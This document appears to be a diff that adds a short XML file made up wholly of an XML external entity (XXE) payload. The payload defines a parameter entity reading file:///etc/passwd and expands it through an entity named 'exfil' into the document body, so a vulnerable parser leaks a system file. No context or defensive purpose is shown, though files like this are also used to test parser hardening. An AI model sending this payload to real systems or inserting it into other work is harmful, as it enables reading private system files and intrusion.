@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % wrap "<!ENTITY exfil '%file;'>">
+  %wrap;
+]>
+<foo>&exfil;</foo>
